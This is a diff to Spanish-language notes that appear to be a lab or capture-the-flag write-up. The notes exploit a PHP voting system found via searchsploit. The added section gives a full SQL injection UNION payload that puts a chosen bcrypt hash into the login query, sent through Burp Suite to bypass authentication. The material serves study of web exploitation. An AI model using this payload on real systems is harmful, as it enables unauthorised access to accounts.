@@ -46,3 +46,9 @@ searchsploit "voting system" -m php/webapps/49843.txt
 Utilizaremos [[BURPSUITE]] para poder explotarlo interceptando la petición y pudiendo modificarla
 
 ### SQL Injection
+Como vemos en la explotación que nos indica que hay que realizar en el archivo obtenido anteriormente, debemos de modificar los valores del campo de `login`.
+Usando [[BURPSUITE]], interceptaremos la petición y en el campo mencionado introduciremos el payload que se nos aporta
+```sql
+login=yea&password=admin&username=dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -
+```
+
